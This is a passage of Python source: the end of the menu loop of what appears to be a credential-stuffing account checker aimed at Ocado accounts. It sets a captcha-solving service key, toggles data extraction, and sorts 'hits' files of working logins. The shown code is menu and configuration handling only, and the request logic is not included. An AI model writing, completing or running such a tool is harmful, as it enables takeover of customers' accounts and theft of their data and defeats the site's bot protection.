                to = input(f"  {g}Timeout (s):{T} ").strip()
                S.timeout = max(3, int(to or "8"))
                save_config(S)
            except ValueError:
                print(f"\n  {R}Invalid{T}")
                input()
            continue

        elif c == "5":
            k = input(f"  {g}NextCaptcha Key:{T} ").strip()
            if k:
                S.captcha_key = k
                save_config(S)
            continue

        elif c == "6":
            S.extract = not S.extract
            save_config(S)
            continue

        elif c == "7":
            p = input(f"  {g}Hits file path:{T} ").strip().strip('"').strip("'")
            if p and Path(p).exists():
                sort_hits(p)
            else:
                # Try to find latest hits file in cwd
                hits_files = sorted(Path.cwd().glob("ocado_hits_*.txt"),
                                    key=lambda x: x.stat().st_mtime, reverse=True)
                if hits_files:
                    p = str(hits_files[0])
                    print(f"  {g}Found: {Path(p).name}{T}")
                    sort_hits(p)
                else:
                    print(f"\n  {R}No hits file found{T}")
            input(f"\n  {g}Press enter...{T}")
            continue

        elif c == "q":
            cls()
            break


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        cls()
        print(f"\n{g}Exited.{T}")
